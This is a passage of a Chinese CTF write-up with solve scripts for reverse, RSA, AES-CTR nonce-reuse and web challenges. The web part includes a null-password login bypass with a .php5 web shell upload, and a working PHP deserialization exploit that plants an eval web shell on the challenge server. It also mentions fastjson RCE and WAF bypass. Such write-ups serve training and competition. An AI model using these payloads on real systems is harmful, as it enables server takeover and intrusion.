17703,-16114,-24359,54532,15266,5819,-33999,19362,-58904,63538,64858,2665,-11844,-29623,20144,43681,32755,-42532,-60912,20331,3541,53780,29817,-4711,-56853,57822,31675,52683,57988,-33486,12097,24590</span></span><br><span class="line"><span class="comment"># 24247,64898,-24733,3430,41149,17219,-16545,42702,-1315,24960,27013,28,2783,-15867,-12126,28232,-3823,37522,48151,-20727,-12037,-9347,-39338,-50524,-38675,-26114,-4975,59561,32393,36741,51792,-24297</span></span><br><span class="line"><span class="comment"># -32261,-54551,15294,-61664,-40648,-12277,-55300,-63212,41251,-45548,-22362,-32993,64221,-43046,-40770,5380,57738,62825,52035,3079,-7119,26782,-36194,-56102,-19468,54655,35562,-59856,25143,13289,64702,23822</span></span><br><span class="line"><span class="comment"># -9407,64048,60965,33702,-12654,-56126,-47366,47843,30627,-29056,32583,-50822,-6240,43847,47577,-12371,8314,22558,9886,43924,-23282,-13137,-13716,6461,63681,-43391,-37217,-43714,-55909,-62806,5977,36688</span></span><br><span class="line"><span class="comment"># -23136,47281,20301,-61441,2565,57144,44459,-31365,16024,54218,-56894,-52977,-39404,-63477,63390,-22773,46343,-50258,40389,-25970,23917,-56685,47030,5856,-55893,36904,44955,58093,13407,49426,26401,-25199</span></span><br><span class="line"><span class="comment"># 62577,23069,18654,4696,22400,-16178,42663,-34941,-50803,-28229,15341,3911,-45565,50053,-45774,18373,7881,-28140,1742,-29986,58351,14952,-40067,15201,11269,53436,41681,22198,-63863,-50393,-14615,16722</span></span><br><span class="line"><span class="comment"># -39728,57392,910,37963,-2274,-61995,-43938,-12412,-10642,-10303,31888,7362,-16356,-615,40135,-11314,-17185,54431,-61134,-4620,-4591,29560,35119,-51958,40581,34037,-65066,5750,-6232,-60002,17326,30503</span></span><br><span class="line"><span class="comment"># -16296,-8786,48180,-65236,-48383,-32713,61315,-58771,-47593,-14512,6483,56260,25366,58190,-60203,27537,50686,-7295,-3885,61335,-39212,-40687,-19258,-57463,32582,2313,-24504,-11629,-8917,31106,-4535,38212</span></span><br><span class="line"><span class="comment"># -31610,52623,-35005,25689,-9320,63683,39253,51102,-16508,11413,3265,35320,18706,6847,-55110,528,35247,-63180,30153,-13666,39538,-49046,33264,51928,13203,17103,59096,48721,33683,-42949,-60950,26096</span></span><br><span class="line"><span class="comment"># 47557,52902,-12806,-59773,-9182,-57417,-18447,6146,15859,59808,30791,-54963,45466,-61599,49637,21116,15786,3656,-18454,28722,46709,21307,50390,5176,-30277,-25544,-17882,-25149,61328,-17363,49588,21848</span></span><br><span class="line"><span class="comment"># 37688,23309,-2616,59129,5104,-12561,-3215,60503,29438,42505,-49703,38339,12457,45365,-15471,33925,-23447,-50859,-86,54770,36604,-3773,-9573,-25835,42417,4680,-20107,58284,-45915,-56171,18191,29164</span></span><br><span class="line"><span class="comment"># 20452,18062,-56424,56918,-10457,50206,-12288,-54591,-44777,24700,12962,38458,-52078,19385,18867,-9805,-48011,-27363,-20890,13714,-788,50998,29867,-7954,-34056,16127,5149,49705,-34732,-54092,64657,35416</span></span><br><span class="line"><span class="comment"># -39611,25246,1951,-37145,-3824,21330,-49145,-43603,8191,-60671,-53032,-48392,-15417,40645,-13059,-58653,42329,-51631,-50173,18903,52431,-44904,37330,40656,-34380,24333,41644,-18100,-57765,-64534,44968,-26760</span></span><br><span class="line"><span class="comment"># -39824,44401,45166,53538,-2540,43929,-54452,-11199,-19801,23926,-13592,47959,19579,-29922,30392,15405,61374,17545,39526,7046,-34144,57593,-5305,-46917,44211,-4511,-23881,29438,-39081,34688,28579,3296</span></span><br><span class="line"><span class="comment"># 62215,19566,15203,-30340,-15964,59815,-13939,60087,-43008,-44925,-49239,-40498,-54453,-33557,6928,24510,36587,-24721,7959,49381,-21456,-40311,8487,-61111,-18918,-33393,-9301,41415,-61619,64380,40454,58498</span></span><br><span class="line"><span class="comment"># 35423,-12994,33894,40977,57560,63291,-32256,-23534,40291,5725,-40660,43131,-19119,21483,39085,62097,-33732,-63756,35027,3633,30380,36333,-13528,53612,6578,-47605,10809,-43202,14305,2766,-42819,-34232</span></span><br><span class="line"><span class="comment"># 44942,63420,58838,55103,27162,53130,27559,26302,-24313,-42499,-21629,34155,-2633,-55014,-22926,19761,-305,-63708,13647,31419,62674,-32334,-47684,-54226,-50848,10136,26215,44427,27903,48054,-15102,-22362</span></span><br><span class="line"><span class="comment"># 6300,-30549,9153,26426,46559,-55683,62261,-44433,6137,-46194,-57198,33875,-45266,51231,65438,45781,-6605,-43397,-7672,-48485,-54035,-12567,-47051,-62256,13058,55552,4221,61587,23936,-9828,59525,50225</span></span><br><span class="line"><span class="comment"># -28415,36297,5686,59059,14796,-11307,-57251,-29507,-41415,12090,62270,8353,-24476,-41751,-46589,63967,55058,10481,30422,47722,-55870,-6321,53136,12704,42884,-34350,-32922,-64909,-50870,13236,39286,49349</span></span><br><span class="line"><span class="comment"># 15479,10453,58731,-9782,63976,-9166,5707,-21516,-2689,29174,23244,-47968,-38843,-13488,61646,3991,57764,-57649,63445,-487,6252,52361,16634,42491,-30704,54808,-61218,18612,-32873,-58677,-2280,35233</span></span><br><span class="line"><span class="comment"># 36368,-30534,50614,-7805,9520,-60795,-17511,-34692,-22139,-49013,-24672,41197,35504,28641,11252,-22264,56629,23301,-55578,-61882,-48469,28509,-8197,-43020,15688,29396,-36911,38392,58430,-6762,38132,56670</span></span><br><span class="line"><span class="comment"># 3542,-17533,28247,1791,-44455,-2748,21876,-38052,8511,61205,-16528,-4664,-13326,16494,-52661,-38860,58300,-60164,-39975,-19566,55072,-55251,-8160,-54674,58305,-29010,-6627,35318,-15962,19958,-10549,-8177</span></span><br><span class="line"><span class="comment"># -7510,-61303,25124,35004,-34033,-49161,-6021,-36125,37617,-10528,-47741,-45531,-1546,2052,-59464,29853,-22656,31346,26883,38644,26034,-24655,-9816,8621,-22299,-23745,37204,47703,13827,15394,-23945,48741</span></span><br><span class="line"><span class="comment"># 19310,1288,-38840,-49229,-40618,39102,34746,-41363,-45367,41169,-21440,-36535,33349,-43289,47866,5395,56668,-41392,30949,53570,-40337,16432,-1430,-28334,35917,-46487,61644,8511,-42458,27496,-59664,64335</span></span><br><span class="line"><span class="comment"># -18187,28981,-53485,17974,41797,-20458,-8491,-16831,33384,53494,-31995,51835,-12109,30996,42087,60427,12986,-51691,-58925,-40872,33269,3954,56824,-30202,59304,-30793,26203,13806,-42110,41403,-1100,-26194</span></span><br><span class="line"><span class="comment"># -40011,-26232,-4849,-60564,20386,44081,-50739,40590,-17237,19883,-35381,28950,-4203,19225,-50964,-39946,28859,12186,38175,-22511,-20539,15071,48156,34737,42732,-60250,-61430,-11009,47559,53536,-8879,46741</span></span><br><span class="line"><span class="comment"># -42653,43668,-10988,3756,34932,61953,22126,29632,59350,-48711,-23958,-33557,50367,41961,-17831,-4583,41615,27387,34328,-29750,9871,-49888,41239,18672,20039,56136,-30956,7689,45907,5442,-41068,23514</span></span><br><span class="line"><span class="comment"># -26968,-23313,38342,5179,10458,3678,-32333,-43275,-2423,-60827,-42621,15986,-27590,59508,53583,19553,-56307,869,6738,63177,-30359,50228,21760,-19919,24036,-18153,41909,-6931,-5822,-30949,-16572,11920</span></span><br><span class="line"><span class="comment"># 8386,57646,35980,-4029,8314,18877,4313,29760,-47059,46356,52295,35013,57567,-25490,64744,1703,55168,-62526,37870,-63227,-27315,31098,6747,63177,55323,-23370,-37329,54696,-6309,43819,-12433,8882</span></span><br><span class="line"><span class="comment"># 63776,8682,-16324,-20022,143,-48973,-57775,-43820,-41070,33388,25687,-15669,-6946,-23187,32765,-46495,-8395,17994,-27782,39834,42821,-46043,12690,36806,28202,-15428,41549,17153,-59010,-49235,-53666,28539</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 34771791</span></span><br><span class="line"><span class="comment"># -9451883</span></span><br><span class="line"><span class="comment"># 29782736</span></span><br><span class="line"><span class="comment"># 27959979</span></span><br><span class="line"><span class="comment"># -10644544</span></span><br><span class="line"><span class="comment"># 230179</span></span><br><span class="line"><span class="comment"># 15871572</span></span><br><span class="line"><span class="comment"># 12844672</span></span><br><span class="line"><span class="comment"># -7906855</span></span><br><span class="line"><span class="comment"># -5359162</span></span><br><span class="line"><span class="comment"># 34815239</span></span><br><span class="line"><span class="comment"># 23582278</span></span><br><span class="line"><span class="comment"># 30273764</span></span><br><span class="line"><span class="comment"># 7501764</span></span><br><span class="line"><span class="comment"># -35816639</span></span><br><span class="line"><span class="comment"># 30983928</span></span><br><span class="line"><span class="comment"># -4472687</span></span><br><span class="line"><span class="comment"># 18523534</span></span><br><span class="line"><span class="comment"># 20982750</span></span><br><span class="line"><span class="comment"># 5070455</span></span><br><span class="line"><span class="comment"># 3066924</span></span><br><span class="line"><span class="comment"># 26232118</span></span><br><span class="line"><span class="comment"># -860377</span></span><br><span class="line"><span class="comment"># -14482154</span></span><br><span class="line"><span class="comment"># -17062269</span></span><br><span class="line"><span class="comment"># 6695285</span></span><br><span class="line"><span class="comment"># 16909859</span></span><br><span class="line"><span class="comment"># -1622782</span></span><br><span class="line"><span class="comment"># 33025495</span></span><br><span class="line"><span class="comment"># -10454601</span></span><br><span class="line"><span class="comment"># 51177223</span></span><br><span class="line"><span class="comment"># -15479857</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = [<span class="number">99</span>,<span class="number">115</span>,<span class="number">50</span>,<span class="number">56</span>,<span class="number">82</span>,<span class="number">116</span>,<span class="number">116</span>,<span class="number">104</span>,<span class="number">72</span>,<span class="number">113</span>,<span class="number">115</span>,<span class="number">98</span>,<span class="number">117</span>,<span class="number">102</span>,<span class="number">111</span>,<span class="number">106</span>,<span class="number">115</span>,<span class="number">76</span>,<span class="number">122</span>,<span class="number">55</span>,<span class="number">121</span>,<span class="number">103</span>,<span class="number">50</span>,<span class="number">68</span>,<span class="number">89</span>,<span class="number">113</span>,<span class="number">87</span>,<span class="number">81</span>,<span class="number">69</span>,<span class="number">69</span>,<span class="number">99</span>,<span class="number">89</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span>.join([chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> res])</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">nnn1=int(str(n)[:<span class="number">200</span>])<span class="number">-1</span></span><br><span class="line">nnn2=int(str(n)[<span class="number">600</span>:])</span><br><span class="line">ab=int(str(nnn1)+str(nnn2))</span><br><span class="line"></span><br><span class="line">ab=<span class="number">2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line"></span><br><span class="line">a2b2=n-(pow(<span class="number">10</span>,<span class="number">400</span>)+<span class="number">1</span>)*ab <span class="comment">#a**2+b**2</span></span><br><span class="line"><span class="comment"># print a2b2</span></span><br><span class="line">t=a2b2/pow(<span class="number">10</span>,<span class="number">200</span>)</span><br><span class="line"><span class="comment"># print t </span></span><br><span class="line"></span><br><span class="line">t1=t+<span class="number">2</span>*ab <span class="comment">#(a+b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b)**2:"</span>,t1 <span class="comment">#(a+b)**2 </span></span><br><span class="line">t2=t1<span class="number">-4</span>*ab <span class="comment">#(a-b)**2</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b)**2:"</span>,t2 <span class="comment">#(a-b)**2 </span></span><br><span class="line"></span><br><span class="line">tt1=iroot(t1,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a+b):"</span>,tt1 <span class="comment">#(a+b)</span></span><br><span class="line">tt2=iroot(t2,<span class="number">2</span>)[<span class="number">0</span>] </span><br><span class="line"><span class="keyword">print</span> <span class="string">"(a-b):"</span>,tt2 <span class="comment">#(a-b)</span></span><br><span class="line"></span><br><span class="line">b=(tt1-tt2)/<span class="number">2</span></span><br><span class="line">a=tt1-b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"b:"</span>,b</span><br><span class="line"><span class="keyword">print</span> <span class="string">"a:"</span>,a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> iroot(t1,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> iroot(t2,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p = a*pow(<span class="number">10</span>,<span class="number">200</span>)+b</span><br><span class="line">q = b*pow(<span class="number">10</span>,<span class="number">200</span>)+a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p*q==n</span><br><span class="line"><span class="keyword">print</span> <span class="string">"p"</span>,p</span><br><span class="line"><span class="keyword">print</span> <span class="string">"q"</span>,q</span><br><span class="line"></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"d"</span>,d</span><br><span class="line">c=<span class="number">16396023285324039009558195962852040868243807971027796599580351414803675753933120024077886501736987010658812435904022750269541456641256887079780585729054681025921699044139927086676479128232499416835051090240458236280851063589059069181638802191717911599940897797235038838827322737207584188123709413077535201099325099110746196702421778588988049442604655243604852727791349351291721230577933794627015369213339150586418524473465234375420448340981330049205933291705601563283196409846408465061438001010141891397738066420524119638524908958331406698679544896351376594583883601612086738834989175070317781690217164773657939589691476539613343289431727103692899002758373929815089904574190511978680084831183328681104467553713888762965976896013404518316128288520016934828176674482545660323358594211794461624622116836</span></span><br><span class="line">flag = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="keyword">print</span> hex(flag)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>查看加密函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(msg, key)</span>:</span></span><br><span class="line">    ctr = Counter.new(<span class="number">128</span>,  initial_value=sum(msg))</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CTR, counter=ctr)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(msg)</span><br></pre></td></tr></table></figure>

<p>是使用AES的CTR模式，百度了下是把<code>counter</code>加密和明文异或下，即密文是<code>counter^msg</code>,这里的问题就是<code>ctr</code>的初始值是<code>sum(msg)</code>，如果我们输入字符串的<code>sum</code>和<code>flag</code>一样的话，那<code>counter</code>就是一样的，所以<code>flag = encflag^input^enc_input</code></p>
<p>爆破脚本为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span><span class="params">(str1)</span>:</span></span><br><span class="line">	res = <span class="string">''</span></span><br><span class="line">	idx = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span> str1[idx] != <span class="string">'\\'</span>:</span><br><span class="line">			res += str1[idx]</span><br><span class="line">			idx += <span class="number">1</span></span><br><span class="line">		<span class="keyword">elif</span> str1[idx] == <span class="string">'\\'</span> <span class="keyword">and</span> str1[idx+<span class="number">1</span>] == <span class="string">'x'</span> <span class="keyword">and</span> str1[idx+<span class="number">2</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span> <span class="keyword">and</span> str1[idx+<span class="number">3</span>] <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">			res += chr(int(str1[idx+<span class="number">2</span>:idx+<span class="number">4</span>],<span class="number">16</span>))</span><br><span class="line">			idx += <span class="number">4</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			res += str1[idx]</span><br><span class="line">			idx += <span class="number">1</span></span><br><span class="line">	<span class="keyword">assert</span>(len(res) == <span class="number">30</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="comment"># p = remote("111.186.57.123",10001)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(str1)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span> ord(str1[i]) &lt; <span class="number">0x20</span> <span class="keyword">or</span> ord(str1[i]) &gt; <span class="number">0x7f</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">start = <span class="number">0x20</span>*<span class="number">30</span></span><br><span class="line">end = <span class="number">0x7f</span>*<span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = [<span class="number">0x20</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("plaintext: ")</span></span><br><span class="line"><span class="keyword">while</span> sum(l) &lt; end:</span><br><span class="line">	<span class="comment"># p = process("./aes.py")</span></span><br><span class="line">	p = remote(<span class="string">"111.186.57.123"</span>,<span class="number">10001</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"flag: b"</span>)</span><br><span class="line">	enc_flag = p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">	encflag = encode_str(enc_flag)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">		p.recvuntil(<span class="string">"plaintext: "</span>)</span><br><span class="line">		plaintext = (<span class="string">''</span>.join([chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> l]))</span><br><span class="line">		p.sendline(plaintext.encode(<span class="string">'hex'</span>))</span><br><span class="line">		<span class="comment">#inc the l</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">			<span class="keyword">if</span> l[k] &lt; <span class="number">0x7f</span>:</span><br><span class="line">				l[k] += <span class="number">1</span></span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		</span><br><span class="line">		p.recvuntil(<span class="string">"ciphertext: b"</span>)</span><br><span class="line">		ciphertext = encode_str(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">1</span>:<span class="number">-1</span>])</span><br><span class="line">		res = long_to_bytes(bytes_to_long(ciphertext)^bytes_to_long(plaintext)^bytes_to_long(encflag))</span><br><span class="line">		<span class="keyword">if</span> check(res) == <span class="literal">True</span>:</span><br><span class="line">			success(<span class="string">"flag is : %s"</span> % res)</span><br><span class="line">			sys.exit()</span><br><span class="line">	info(str(sum(l)))</span><br><span class="line">	p.close()</span><br><span class="line">	<span class="comment"># p.kill()</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br></pre></td></tr></table></figure>

<p>最终<code>sum(flag)</code>在2760到2790之间<br>flag为 <code>flag{Don&#39;t_Reu5e_n0nCe_1n_CTR}</code></p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p><code>&lt;!---/.login.php.swp--&gt;</code>拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($username))&#123;</span><br><span class="line">    $sql = <span class="string">"select password from user where name=?"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($stmt = $mysqli-&gt;prepare($sql)) &#123;</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($dpasswd);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> ($dpasswd === $password)&#123;</span><br><span class="line">	    $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            header(<span class="string">"Location: /upload.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"login failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">"Location: /index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>

<p>mysql没有查到记录时,<code>$dpasswd===NULL</code><br>此时令<code>$password===NULL</code>即<code>$_POST[&#39;password&#39;]===NULL</code>,则成功登陆</p>
<p>登陆后进入上传界面,测试发现,后端校验文件头和content-type<br>过滤php后缀名,上传.php5文件,成功拿到shell</p>
<p>拿到flag:flag{logical_bypass_not_weak_password}</p>
<h2 id="ezbypass"><a href="#ezbypass" class="headerlink" title="ezbypass"></a>ezbypass</h2><p>n day json bypass disable_function</p>
<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire = <span class="string">'8888'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cache = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $autosave = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $complete = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = <span class="keyword">new</span> B();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'hi.php'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = [<span class="string">'path'</span>=&gt;<span class="string">'a'</span>,<span class="string">'dirname'</span>=&gt;base64_encode(<span class="string">'&lt;?php eval($_GET[a]);   ?'</span>.<span class="string">'&gt; '</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options = [</span><br><span class="line">        <span class="string">'serialize'</span> =&gt; <span class="string">'serialize'</span>,</span><br><span class="line">        <span class="string">'prefix'</span> =&gt; <span class="string">'php://filter/write=convert.base64-decode/resource=uploads/'</span>,</span><br><span class="line">        <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $writeTimes = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">'http://111.186.57.61:10401/?data='</span> . urlencode(serialize(<span class="keyword">new</span> A())));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'====='</span>;</span><br></pre></td></tr></table></figure>

<h2 id="ezjjava"><a href="#ezjjava" class="headerlink" title="ezjjava"></a>ezjjava</h2><p>fastjson 1.2.47 RCE<br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
<h2 id="ezwaf"><a href="#ezwaf" class="headerlink" title="ezwaf"></a>ezwaf</h2><p>参考之前 RoarCTF 中畸形包绕 modsecurity  </p>
